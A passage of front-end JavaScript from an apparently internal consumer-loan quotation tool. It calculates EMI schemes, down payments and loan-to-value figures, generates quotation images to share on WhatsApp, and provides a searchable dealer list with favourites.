        let expBadge = d.isExpired ? `<div style="color:#d35400; font-size:9px; font-weight:900; margin-top:3px; line-height:1.2; background:#ffeaa7; padding:2px; border-radius:3px;">⚠️ EXPIRED<br>Check Live</div>` : ''; 
        document.getElementById(`ta_${pIdx}_${dIdx}`).innerHTML = `${calcTenure}/${d.advEmi}${expInfo}${expBadge}`; document.getElementById(`inst_${pIdx}_${dIdx}`).innerText = inst; 
        d.loan = loan; d.currentTenure = calcTenure; d.dp = dpR; d.inst = inst; d.emi = emi; 
    } else { 
        let nbfcMaxL = (currentLimit * d.tenure) / (d.tenure - d.advEmi || 1); 
        let maxBoundary = Math.min(loanCapPrice > 0 ? loanCapPrice : 999999, nbfcMaxL, prod.isNonTieup ? d.maxLoan : 9999999); 
        if(loan > maxBoundary) { loan = maxBoundary; } 
        
        if (effectivePrice > 0 && loan < minAllowedLoanByInvoice) {
            loan = minAllowedLoanByInvoice;
        }

        if (effectivePrice > 0 && loan > effectivePrice) {
            loan = effectivePrice;
        }
        
        el.value = Math.floor(loan); 
        
        let roiInEmi = loan * roiRate; let roiInDp = loan * roiRateDP; 
        dpE = effectivePrice - loan + ((loan/d.tenure) * d.advEmi) + (loan * dbdRate) + appliedPf + totalFees + roiInDp; 
        dpR = Math.ceil(dpE / 10) * 10; let inst = d.tenure - d.advEmi; if(inst < 1) inst = 1; 
        let insTotal = (parseFloat(inp.gtl)||0)+(parseFloat(inp.rfc)||0)+(parseFloat(inp.exw)||0); 
        
        let baseEmi = loan / d.tenure;
        if (baseEmi > 0 && baseEmi < 900) baseEmi = 900; 

        let emi = baseEmi + (insTotal / inst) + roiInEmi; 
        d.loan = loan; d.dp = dpR; d.emi = emi; 
    }
    
    d.extra = effectivePrice > 0 ? (((d.emi * d.inst) + d.dp) - effectivePrice) : 0; d.dbdAmt = loan * dbdRate; d.roiAmt = (loan * roiRateDP) + (loan * roiRate * d.inst); 
    let marginMoney = parseFloat(inp.margin) || 0; let roundupAdj = (dpR > dpE) ? (dpR - dpE) : 0; 
    d.netDisb = effectivePrice > 0 ? (effectivePrice - dpR - marginMoney - roundupAdj) : 0;
    
    prod.inputs.manualLoans = prod.inputs.manualLoans || {};
    prod.inputs.manualLoans[dIdx] = loan;

    document.getElementById(`dp_${pIdx}_${dIdx}`).innerText = "₹" + Math.round(d.dp).toLocaleString(); 
    document.getElementById(`emi_${pIdx}_${dIdx}`).innerText = "₹" + Math.round(d.emi).toLocaleString(); 
    let ndCell = document.getElementById(`nd_${pIdx}_${dIdx}`); if(ndCell) ndCell.innerText = "₹" + Math.round(d.netDisb).toLocaleString();
    d.curLTV = d.currentTenure > 0 ? ((d.currentTenure - d.advEmi) / d.currentTenure) * 100 : 0; 
    let ltvCell = document.getElementById(`ltv_${pIdx}_${dIdx}`); if(ltvCell) ltvCell.innerText = Math.round(d.curLTV) + "%"; 
    let extraCell = document.getElementById(`extra_${pIdx}_${dIdx}`); if(extraCell) extraCell.innerText = "₹" + Math.round(d.extra).toLocaleString();
    
    let isB = (d.curLTV > ltvLimit) || (prod.isNonTieup && loan > 0 && (loan < d.minLoan || loan > d.maxLoan)) || (effectivePrice > 0 && loan < minAllowedLoanByInvoice); 
    let rowEl = document.getElementById(`row_${pIdx}_${dIdx}`); 
    if(rowEl) { if (isB) { rowEl.classList.add('ltv-breach'); } else { rowEl.classList.remove('ltv-breach'); } }
    
    let dbdCell = document.querySelector(`#row_${pIdx}_${dIdx} td:nth-child(2)`); if(dbdCell) dbdCell.innerHTML = `${+parseFloat(d.dbd).toFixed(3)}%<br><span style="color:var(--danger); font-weight:900;">₹${Math.round(d.dbdAmt||0).toLocaleString()}</span>`; 
    let roiCell = document.querySelector(`#row_${pIdx}_${dIdx} td:nth-child(4)`); if(roiCell) roiCell.innerHTML = `${+parseFloat(d.roi).toFixed(2)}%<br><span style="color:var(--danger); font-weight:900;">₹${Math.round(d.roiAmt||0).toLocaleString()}</span>`;
    customerQueue[activeCustomerIndex].products = current_products; saveQueueToLocal(); 
}

function sortM(pIdx, key) { let conf = sortConfigs[pIdx]; conf.dir = (conf.key === key && conf.dir === 'asc') ? 'desc' : 'asc'; conf.key = key; renderRows(pIdx); customerQueue[activeCustomerIndex].products = current_products; saveQueueToLocal(); }

function copySchemeText(pIdx, dIdx, btnElement) {
    let prod = current_products[pIdx], d = prod.calculatedData.find(x => x.dIdx === dIdx); let invAmt = prod.inputs.inv > 0 ? prod.inputs.inv : prod.inputs.mrp; let c = customerQueue[activeCustomerIndex]; let cappingLine = (c.cap && c.cap !== "") ? `\nEMI CAPPING- ${c.cap}` : ""; let custDetails = `Customer Name- ${c.name}\nNumber- ${c.mobile || ''}\nLimit- ${c.limit}\nLTV- ${c.ltv}${cappingLine}\n\n`;
    let textToCopy = `${custDetails}📱 *${prod.name}*\n${invAmt > 0 ? `*INVOICE AMOUNT:* ₹${invAmt}\n\n` : "" }✅ *Scheme:* ${d.currentTenure}/${d.advEmi}\n💰 *DP:* ₹${Math.round(d.dp).toLocaleString()}\n🗓️ *EMI:* ₹${Math.round(d.emi).toLocaleString()} x ${d.inst}\n✨ *Daily EMI:* ₹${Math.round(d.daily).toLocaleString()}`;
    function showSuccess() { let originalText = btnElement.innerText; btnElement.innerText = "COPIED!"; btnElement.style.background = "var(--success)"; setTimeout(() => { btnElement.innerText = originalText; btnElement.style.background = "var(--primary)"; }, 2000); }
    if (navigator.clipboard && window.isSecureContext) { navigator.clipboard.writeText(textToCopy).then(showSuccess).catch(() => fallbackCopy(textToCopy, showSuccess)); } else { fallbackCopy(textToCopy, showSuccess); }
}

function fallbackCopy(text, successCb) {
    let ta = document.createElement("textarea"); ta.value = text; ta.setAttribute('readonly', ''); ta.style.position = "absolute"; ta.style.left = "-9999px"; document.body.appendChild(ta); ta.select(); ta.setSelectionRange(0, 99999); 
    try { let success = document.execCommand('copy'); if (success) { successCb(); } else { showCustomAlert("Auto-copy block zala ahe. Kripya manually copy kara:", text); } } catch (err) { showCustomAlert("Auto-copy fail zala. Kripya manually copy kara:", text); } document.body.removeChild(ta);
}

async function toggleInactive(pIdx, dIdx) { let prod = current_products[pIdx]; let scheme = prod.schemes[dIdx]; scheme.inactive = !scheme.inactive; recalcModel(pIdx); customerQueue[activeCustomerIndex].products = current_products; await saveQueueToLocal(); }

async function executeManualAction() {
    let mode = document.getElementById('targetPIdx').value; 
    let scheme = { tenure: parseInt(document.getElementById('manTen').value), advEmi: parseInt(document.getElementById('manAdv').value), dbd: parseFloat(document.getElementById('manDbd').value)||0, pf: parseInt(document.getElementById('manPf').value)||0, roi: parseFloat(document.getElementById('manRoi').value)||0, fixedEmi: parseInt(document.getElementById('manFixed').value)||0, minLoan: 0, maxLoan: 9999999, category: "MANUAL", inactive: false, isExpired: false, expiryDateStr: "" };
    let cCap = customerQueue[activeCustomerIndex]?.cap || "";
    if(mode === "NEW") { let name = document.getElementById('manName').value.toUpperCase() || "MANUAL MODEL"; let comp = customerQueue[activeCustomerIndex].components || {}; current_products.push({ name: name, schemes: [scheme], category: "MANUAL", inputs: { mrp: "", inv: "", cap: cCap, target: "", gtl: 0, rfc: 0, exw: comp.exw||"", margin: comp.margin||"", dealer: comp.dealer||"", surch: 0, manualLoans: {} }, isManual: true }); sortConfigs.push({ key: 'dp', dir: 'asc' }); customerQueue[activeCustomerIndex].products = current_products; customerQueue[activeCustomerIndex].sortConfigs = sortConfigs; await saveQueueToLocal(); renderMatrix(); } else { current_products[mode].schemes.push(scheme); recalcModel(parseInt(mode)); } closeManualModal();
}

function openQuoteSelectionModal() {
    if(current_products.length === 0) { showToast("⚠️ Kripya pehle matrix mein koi product add karein!", "warning"); return; }
    let html = current_products.map((p, idx) => ` <div style="display:flex; align-items:center; gap:8px; padding:8px; background:#f8f9fa; border:1px solid #ddd; border-radius:4px;"> <input type="checkbox" id="qchk_${idx}" class="quote-model-chk" value="${idx}" style="width:16px; height:16px; cursor:pointer;"> <label for="qchk_${idx}" style="font-size:14px; font-weight:bold; cursor:pointer; flex:1; margin:0;">${p.name}</label> </div> `).join('');
    document.getElementById('quoteModelCheckboxes').innerHTML = html; document.getElementById('quoteSelectionModal').style.display = 'flex';
}

function promptForSelectedImageGeneration() {
    let chks = document.querySelectorAll('.quote-model-chk:checked'); if(chks.length === 0) { showToast("⚠️ Kripya image generate karne ke liye kam se kam ek model select karein!", "warning"); return; }
    window.tempImageGenIndices = Array.from(chks).map(c => parseInt(c.value)); document.getElementById('quoteSelectionModal').style.display = 'none'; requestWhatsAppDispatch = false; doGenerateCustomerImage();
}

let requestWhatsAppDispatch = false;
function proceedGenerateImage() { requestWhatsAppDispatch = false; document.getElementById('custInfoPromptModal').style.display = 'none'; doGenerateCustomerImage(); }
function proceedGenerateImageAndWhatsAppCopy() { requestWhatsAppDispatch = true; document.getElementById('custInfoPromptModal').style.display = 'none'; doGenerateCustomerImage(); }

/* === UPDATED: QUOTATION IMAGE GENERATOR WITH CLEAN SLEEK FINTECH BADGES === */
function doGenerateCustomerImage() {
    let quoteDiv = document.createElement('div'); quoteDiv.style.width = "560px"; quoteDiv.style.padding = "25px"; quoteDiv.style.background = "#fff"; quoteDiv.style.position = "absolute"; quoteDiv.style.top = "-9999px"; quoteDiv.style.fontFamily = "'Segoe UI', sans-serif";
    let c = customerQueue[activeCustomerIndex]; let headerText = c?.name && c.name !== "-" ? c.name.toUpperCase() : "CUSTOMER QUOTATION"; let ltvLimit = c?.ltv || 100;
    let html = ` <div style="background: linear-gradient(135deg, var(--bajaj-blue) 0%, var(--indigo) 100%); border-radius: 12px; padding: 25px; color: white; text-align: center; margin-bottom: 25px; box-shadow: 0 4px 15px rgba(0,0,0,0.15);"> <h2 style="margin:0; font-size:28px; font-weight:900; letter-spacing: 1px; color:#fff;">🎉 EXCLUSIVE OFFERS FOR YOU!</h2> <h3 style="margin:8px 0 18px 0; color:#87c3f7; font-size:22px;">👤 ${headerText} ${c?.mobile ? `| 📞 ${c.mobile}` : ''}</h3> <div style="background: rgba(255,255,255,0.1); padding: 15px; border-radius: 8px; border: 1px dashed rgba(255,255,255,0.4); display: inline-block; width: 90%;"> <div style="font-size: 14px; color: #e0e0e0; font-weight: bold; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 2px;">Your Approved Eligibility</div> <div style="display:flex; justify-content:center; gap:20px; font-weight:900; font-size: 17px;"> <span style="color:#00e676;">LIMIT: ₹${c?.limit || 0}</span> <span style="color:#ffd54f;">MAX LTV: ${ltvLimit}%</span> <span style="color:#fff;">TYPE: ${c?.type || 'NEW'}</span> ${c?.cap ? `<span style="color:#ff8a65;">EMI CAP: ₹${c.cap}</span>` : ''} </div> </div> </div>`;

    let hasV = false; let productsToRender = window.tempImageGenIndices.map(idx => current_products[idx]);
    productsToRender.forEach((prod) => {
        let validS = prod.calculatedData.filter(d => { let isLtvB = (d.curLTV > ltvLimit); let isBoundB = false; if (prod.isNonTieup && prod.inputs.mrp > 0) { if (d.loan < d.minLoan || d.loan > d.maxLoan) isBoundB = true; } return !isLtvB && !isBoundB && !d.inactive && !d.isInv50Breach && d.loan > 0; });
        if(validS.length === 0) return; hasV = true; let invAmt = prod.inputs.inv > 0 ? prod.inputs.inv : prod.inputs.mrp;

        let winDp = [...validS].sort((a,b) => a.dp - b.dp)[0]; 
        let winEmi = [...validS].sort((a,b) => a.emi - b.emi)[0]; 
        let winPop = [...validS].filter(s => s.roi === 0 || s.isFixed).sort((a,b) => a.dp - b.dp)[0] || validS[0]; 
        let winBalance = [...validS].sort((a,b) => (a.dp + (a.emi * 2)) - (b.dp + (b.emi * 2)))[0] || validS[0];
        
        let schemeMap = new Map(); validS.forEach(s => schemeMap.set(s.dIdx, { scheme: s, badges: [] }));

        if (winDp) { let entry = schemeMap.get(winDp.dIdx); entry.badges.push("DP"); }
        if (winEmi && !schemeMap.get(winEmi.dIdx).badges.includes("EMI")) { let entry = schemeMap.get(winEmi.dIdx); entry.badges.push("EMI"); }
        if (winPop && !schemeMap.get(winPop.dIdx).badges.includes("POP")) { let entry = schemeMap.get(winPop.dIdx); entry.badges.push("POP"); }
        if (winBalance && !schemeMap.get(winBalance.dIdx).badges.includes("BAL")) { let entry = schemeMap.get(winBalance.dIdx); entry.badges.push("BAL"); }

        let badgeDetails = {
            "DP": { text: "▼ LOWEST DP", bg: "#059669", color: "#ffffff", rowBg: "#ecfdf5", accent: "#059669" },
            "EMI": { text: "▼ LOWEST EMI", bg: "#2563eb", color: "#ffffff", rowBg: "#eff6ff", accent: "#2563eb" },
            "POP": { text: "★ TOP CHOICE", bg: "#d97706", color: "#ffffff", rowBg: "#fffbeb", accent: "#d97706" },
            "BAL": { text: "✦ BEST VALUE", bg: "#7c3aed", color: "#ffffff", rowBg: "#f5f3ff", accent: "#7c3aed" }
        };

        let badgedEntries = Array.from(schemeMap.values()).filter(e => e.badges.length > 0);
        badgedEntries.sort((a, b) => b.badges.length - a.badges.length);
        let top4Entries = badgedEntries.slice(0, 4);
        let top4Schemes = top4Entries.map(e => e.scheme).sort((a, b) => a.dp - b.dp);
        let topSchemeIDs = new Set(top4Schemes.map(s => s.dIdx));

        let remainingSchemes = validS.filter(d => !topSchemeIDs.has(d.dIdx)).sort((a, b) => a.dp - b.dp);

        let top4RowsHtml = top4Entries.map((item, i) => {
            let d = item.scheme;
            let primaryBadge = badgeDetails[item.badges[0]] || badgeDetails["DP"];

            let bHtml = item.badges.map(b => `
                <div style="background:${badgeDetails[b].bg}; color:${badgeDetails[b].color}; font-size:10px; font-weight:900; margin-top:5px; padding:3px 7px; border-radius:4px; display:inline-block; letter-spacing:0.5px; text-transform:uppercase;">
                    ${badgeDetails[b].text}
                </div>
            `).join('<br>');

            return `
                <tr style="background:${primaryBadge.rowBg}; border-bottom: 2px solid #cbd5e1; border-left: 6px solid ${primaryBadge.accent};">
                    <td style="padding:15px 6px; font-size:16px; font-weight:950; color:#1e293b; line-height:1.2;">
                        <span style="font-size:18px;">${d.currentTenure}/${d.advEmi}</span><br>
                        ${bHtml}
                    </td>
                    <td style="padding:15px 6px; color:#059669; font-size:17px; font-weight:950;">₹${Math.round(d.dp).toLocaleString()}</td>
                    <td style="padding:15px 6px; color:#2563eb; font-size:17px; font-weight:950;">₹${Math.round(d.emi).toLocaleString()}</td>
                    <td style="padding:15px 6px; font-size:16px; font-weight:950; color:#1e293b;">${d.inst}</td>
                    <td style="padding:15px 6px; color:#ea580c; font-size:17px; font-weight:950;">₹${Math.round(d.daily).toLocaleString()}</td>
                </tr>
            `;
        }).join('');

        let remainingRowsHtml = "";
        if (remainingSchemes.length > 0) {
            remainingRowsHtml += `
                <tr style="background:#f1f5f9; border-top: 2px solid #cbd5e1; border-bottom: 2px solid #cbd5e1;">
                    <td colspan="5" style="padding:10px; font-size:13px; font-weight:950; color:#475569; letter-spacing:0.5px; text-align:center;">
                        👇 इतर उपलब्ध पर्याय (OTHER SCHEMES) 👇
                    </td>
                </tr>
            `;
            remainingRowsHtml += remainingSchemes.map((d, i) => `
                <tr style="background:${i%2==0?'#ffffff':'#fcfcfc'}; color:#64748b; border-bottom: 1px solid #ededed;">
                    <td style="padding:10px 6px; font-size:15px; font-weight:900; color:#334155;">${d.currentTenure}/${d.advEmi}</td>
                    <td style="padding:10px 6px; color:#10b981; font-size:15px; font-weight:900;">₹${Math.round(d.dp).toLocaleString()}</td>
                    <td style="padding:10px 6px; color:#3b82f6; font-size:15px; font-weight:900;">₹${Math.round(d.emi).toLocaleString()}</td>
                    <td style="padding:10px 6px; font-size:15px; font-weight:900; color:#475569;">${d.inst}</td>
                    <td style="padding:10px 6px; color:#ea580c; font-size:15px; font-weight:900;">₹${Math.round(d.daily).toLocaleString()}</td>
                </tr>
            `).join('');
        }

        html += `
        <div style="margin-bottom:20px; border-radius: 12px; overflow: hidden; border: 1px solid #dcdfe6; box-shadow: 0 4px 15px rgba(0,0,0,0.06); background:#ffffff; font-family:'Segoe UI', sans-serif; border-left: 6px solid #00a86b;">
            <div style="padding:14px 18px; display:flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #e2e8f0; background: #ffffff;">
                <div style="display:flex; align-items:center; gap:8px;">
                    <span style="font-size:18px;">🧮</span>
                    <h3 style="margin:0; color:#0059A3; font-size:18px; font-weight:950; letter-spacing:0.3px; text-transform:uppercase;">${prod.name}</h3>
                </div>
                <div style="background: #0059A3; color: #ffffff; padding: 6px 14px; border-radius: 6px; font-size:15px; font-weight:950;">
                    INV: ₹${invAmt.toLocaleString()}
                </div>
            </div>
            <div style="padding: 0;">
                <table style="width:100%; border-collapse:collapse; text-align:center; font-family:'Segoe UI', sans-serif;">
                    <thead>
                        <tr style="background:#ffffff; color:#333333; font-size:14px; font-weight:900; text-transform:uppercase; letter-spacing:0.5px; border-bottom: 2px solid #e2e8f0;">
                            <th style="padding:12px 6px;">SCHEME</th>
                            <th style="padding:12px 6px;">DP</th>
                            <th style="padding:12px 6px;">EMI</th>
                            <th style="padding:12px 6px;">M</th>
                            <th style="padding:12px 6px;">DAILY</th>
                        </tr>
                    </thead>
                    <tbody>
                        ${top4RowsHtml}
                        ${remainingRowsHtml}
                    </tbody>
                </table>
            </div>
        </div>`;
    });

    if(!hasV) { showToast("⚠️ Eligibility ke anusar koi Scheme nahi baith rahi hai!", "error"); return; }

    html += `<div style="text-align:center; margin-top: 15px; color:#aaa; font-size: 14px; font-weight: bold; border-top: 1px dashed #ddd; padding-top: 15px;">Generated securely via Persistent Portal</div>`;
    quoteDiv.innerHTML = html; document.body.appendChild(quoteDiv);

    html2canvas(quoteDiv, {scale: 2}).then(canvas => { 
        let imgDataUrl = canvas.toDataURL("image/png"); document.getElementById('generatedImage').src = imgDataUrl; document.getElementById('imageViewerModal').style.display = 'flex'; document.body.removeChild(quoteDiv); 
        if(requestWhatsAppDispatch) {
            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
            if (isMobile) {
                let a = document.createElement("a"); a.href = imgDataUrl; let safeName = c?.name !== "-" ? c.name.replace(/\s+/g, '_') : "Customer"; a.download = `Quotation_${safeName}.png`; document.body.appendChild(a); a.click(); document.body.removeChild(a); showToast("✅ Image downloaded! WhatsApp opening...", "success");
                setTimeout(() => { let mobile = c?.mobile || ""; if(mobile && mobile.length >= 10) window.open(`https://wa.me/91${mobile}`, '_blank'); }, 500);
            } else {
                document.getElementById('clipboardStatusAlert').style.display = 'none';
                canvas.toBlob(blob => {
                    try { navigator.clipboard.write([ new ClipboardItem({ "image/png": blob }) ]).then(() => { document.getElementById('clipboardStatusAlert').style.display = 'block'; setTimeout(() => { let mobile = c?.mobile || ""; if(mobile && mobile.length >= 10) window.open(`https://wa.me/91${mobile}`, '_blank'); }, 500); }).catch(err => { showCustomAlert("📋 Long Press karke Copy Image karein."); let mobile = c?.mobile || ""; if(mobile && mobile.length >= 10) window.open(`https://wa.me/91${mobile}`, '_blank'); }); } 
                    catch (e) { let mobile = c?.mobile || ""; if(mobile && mobile.length >= 10) window.open(`https://wa.me/91${mobile}`, '_blank'); }
                }, 'image/png');
            }
        } else { document.getElementById('clipboardStatusAlert').style.display = 'none'; }
    });
}

/* === DEALER LINKS WITH STAR (FAVORITES) & 3-ITEM COPY FEATURE === */
let showingOnlyStarred = false;

function getStarredDealers() {
    return JSON.parse(localStorage.getItem('persistent_starred_dealers') || '[]');
}

function toggleDealerStar(dealerId, event) {
    if(event) event.stopPropagation();
    let starred = getStarredDealers();
    let idStr = String(dealerId).trim();
    if (starred.includes(idStr)) {
        starred = starred.filter(id => id !== idStr);
        showToast("★ Dealer removed from favorites!", "warning");
    } else {
        starred.push(idStr);
        showToast("★ Dealer added to favorites!", "success");
    }
    localStorage.setItem('persistent_starred_dealers', JSON.stringify(starred));
    searchDealer();
}

function showOnlyStarredDealers() {
    showingOnlyStarred = !showingOnlyStarred;
    let btn = document.getElementById('filterStarBtn');
    if (showingOnlyStarred) {
        btn.style.background = "#ffb400";
        btn.style.color = "#fff";
        btn.innerText = "★ SHOW ALL";
    } else {
        btn.style.background = "#fff3cd";
        btn.style.color = "#856404";
        btn.innerText = "★ FAVORITES";
    }
    searchDealer();
}

function copyThreeDealerItems(dId, dName, bitlyUrl, btnEl, event) {
    if(event) event.stopPropagation();
    let textToCopy = `${dId} - ${dName} - ${bitlyUrl}`;

    function showSuccess() {
        let originalText = btnEl.innerText;
        btnEl.innerText = "COPIED! ✓";
        btnEl.style.background = "var(--primary)";
        btnEl.style.color = "white";
        setTimeout(() => {
            btnEl.innerText = originalText;
            btnEl.style.background = "var(--indigo)";
            btnEl.style.color = "white";
        }, 1500);
        showToast("📋 Dealer ID, Name & Link Copied!", "success");
    }

    if (navigator.clipboard && window.isSecureContext) {
        navigator.clipboard.writeText(textToCopy).then(showSuccess).catch(() => fallbackCopy(textToCopy, showSuccess));
    } else {
        fallbackCopy(textToCopy, showSuccess);
    }
}

function openDealerSearchModal() { 
    document.getElementById('dealerSearchInput').value = ''; 
    showingOnlyStarred = false;
    let btn = document.getElementById('filterStarBtn');
    if(btn) { btn.style.background = "#fff3cd"; btn.style.color = "#856404"; btn.innerText = "★ FAVORITES"; }
    searchDealer();
    document.getElementById('dealerSearchModal').style.display = 'flex'; 
    setTimeout(() => document.getElementById('dealerSearchInput').focus(), 100); 
}

function closeDealerSearchModal() { 
    document.getElementById('dealerSearchModal').style.display = 'none'; 
}

function searchDealer() {
    let q = document.getElementById('dealerSearchInput').value.toLowerCase().trim(); 
    let resultsDiv = document.getElementById('dealerSearchResults');

    if (dealer_records.length === 0) { 
        resultsDiv.innerHTML = '<div style="text-align:center; color:var(--danger); padding: 15px;">⚠️ Dealer data abhi load nahi hua hai.</div>'; 
        return; 
    }

    let starredIds = getStarredDealers();

    if (!q && !showingOnlyStarred) {
        resultsDiv.innerHTML = '<div style="text-align:center; color:#888; padding: 20px;">Type Dealer ID or Name to search...</div>';
        return;
    }

    let parsedDealers = dealer_records.map(d => parseDealerObj(d));

    let matches = parsedDealers.filter(p => { 
        if (showingOnlyStarred && !starredIds.includes(p.code)) return false;
        if (!q && !showingOnlyStarred) return true;

        return p.code.toLowerCase().includes(q) || p.name.toLowerCase().includes(q) || p.city.toLowerCase().includes(q); 
    });

    matches.sort((a, b) => {
        let isStarA = starredIds.includes(a.code);
        let isStarB = starredIds.includes(b.code);

        if (isStarA && !isStarB) return -1;
        if (!isStarA && isStarB) return 1;
        return 0;
    });

    let displayList = matches.slice(0, 50);

    if (displayList.length === 0) { 
        resultsDiv.innerHTML = '<div style="text-align:center; color:#d35400; padding: 15px; font-weight:bold;">कोणताही डीलर सापडला नाही!</div>'; 
        return; 
    }

    resultsDiv.innerHTML = displayList.map(m => { 
        let bitly = m.bitly || '#'; 
        let dId = m.code || '-'; 
        let dName = m.name + (m.city ? ` - ${m.city}` : ''); 
        let isStarred = starredIds.includes(dId);

        let favBtnHtml = isStarred 
            ? `<button onclick="toggleDealerStar('${dId}', event)" style="background:#fff3cd; color:#856404; border:1px solid #ffeeba; padding:4px 8px; border-radius:4px; font-size:10px; font-weight:bold; cursor:pointer;">⭐ FAVORITED</button>`
            : `<button onclick="toggleDealerStar('${dId}', event)" style="background:#f8f9fa; color:#555; border:1px solid #ccc; padding:4px 8px; border-radius:4px; font-size:10px; font-weight:bold; cursor:pointer;">☆ ADD FAV</button>`;

        return ` 
        <div style="display:flex; flex-direction:column; background:${isStarred ? '#fffdf0' : '#fff'}; padding:10px; border-radius:6px; border:1px solid ${isStarred ? '#ffb400' : '#ddd'}; box-shadow: 0 2px 4px rgba(0,0,0,0.05); gap: 8px;"> 
            <div style="display:flex; justify-content:space-between; align-items:flex-start;">
                <div style="flex: 1;">
                    <strong style="color:var(--indigo); display:block; font-size: 14px;">🏪 ${dName}</strong>
                    <span style="color:#555; font-size: 11px; font-weight:bold;">ID: <span style="color:var(--primary); font-weight:900;">${dId}</span></span>
                </div>
                <div>${favBtnHtml}</div>
            </div>
            <div style="display:flex; gap: 5px; border-top: 1px dashed #eee; padding-top: 8px;">
                <button onclick="openBitlyLink('${bitly}')" style="flex:1; background:var(--success); color:white; border:none; padding:6px; border-radius:4px; font-weight:bold; cursor:pointer; font-size:11px;">OPEN LINK ↗</button>
                <button onclick="copyThreeDealerItems('${dId}', '${dName.replace(/'/g, "\\'")}', '${bitly}', this, event)" style="flex:1.5; background:var(--indigo); color:white; border:none; padding:6px; border-radius:4px; font-weight:bold; cursor:pointer; font-size:11px;">📋 COPY DATA</button>
            </div>
        </div>`; 
    }).join('');
}

function openBitlyLink(url) { 
    if (url && url !== '#' && url.trim() !== '') { 
        if (!url.startsWith('http://') && !url.startsWith('https://')) { url = 'https://' + url; } 
        window.open(url, '_blank'); 
        closeDealerSearchModal(); 
    } else { 
        showToast('⚠️ Is dealer ke liye Bitly link available nahi hai!', 'warning'); 
    } 
}
